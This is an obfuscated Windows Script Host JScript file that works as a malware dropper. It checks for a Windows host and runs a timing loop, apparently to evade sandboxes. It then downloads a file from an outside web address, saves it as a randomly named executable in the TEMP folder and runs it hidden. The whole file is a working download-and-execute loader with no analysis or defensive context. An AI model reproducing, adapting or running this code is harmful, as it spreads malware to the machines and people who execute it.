var _H0 = false;
var _V0 = "CreateObject";
var _XS = function _O() {return WScript[_V0]("WScript"+".Shell");}(), _ZX = 11;
var _GU = "MSXML2.XMLHTTP";
var _M = 2123213;
var _H = 0;
function _D1(_PJ){_XS["Run"](_PJ, _H, _H);};
function _MZ(){return _GU + "";};
function _V(_FJ, _AY){_H = _H * 1; return _FJ - _AY;};
function _I(){return _V0;};
/*@cc_on
  @if (@_win32 || @_win64)
    _H0 = true;
  @end
@*/
if (_H0)
{
var _X = "";
function _D0(){return 22;};
var _P = 0; var _J = 0;
function _HZ()
{
var _MU = new this["Date"]();
var _UL = _MU["getUTCMilliseconds"]();
WScript["Sleep"](_D0());
var _MU = new this["Date"]();
var _UN = _MU["getUTCMilliseconds"]();
WScript["Sleep"](_D0());
var _MU = new this["Date"]();
var _CS = _MU["getUTCMilliseconds"]();
var _P = "_E";
_P = _V(_UN, _UL);
var _J = "_Q";
_J = _V(_CS, _UN);
_X = "open";
return _V(_P, _J);
}
var _R = false;
var _P0 = false;
for (var _S = _H; _S < _D0() * 1; _S++){if (_HZ() != _H){
_R = true; 
_J = "31" + 11 * _P + _J; 
_P0 = true; 
break;
}}
function _Y() {return ((_R == true) && (_R == _P0)) ? 1 : _H;};
if (_R && _Y() && _P0){
function _VW() {return _XS["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "oRgvNXNf0aV.ex" + "e";};
 _D2 = _MZ();
 _H1 = WScript[_V0](_D2);
 var _VX = 1;
 while (_VX){
try {
	if (_VX == 1)
	{
		_H1[_X]("GET", "http://pro.monbento.com/n3iska", false);
		_H1["send"]();
		_A = "Sleep";
	}
	WScript[_A](_D0() + 120); 
	if (_H1["readystate"] < 2 * 2) continue;
	_VX = _H;
	function _D(_L) {var _IS = (1, 2, 3, 4, 5, _L); return _IS;};
	_P1 = WScript[_I()]("ADODB.Stream");
	_D2 = _P1;
	_D2[_X]();
	_D2["type"] = _D(1);
	_D2["write"](_H1["ResponseBody"]);
	_P1["position"] = _D(_H);
	_D2["Save" + "ToFile"](_VW(), 2);
	_P1["cl"+"ose"]();
	_HS = _VW();
	_D1(_HS);
} catch(_O0){};
}
}
}

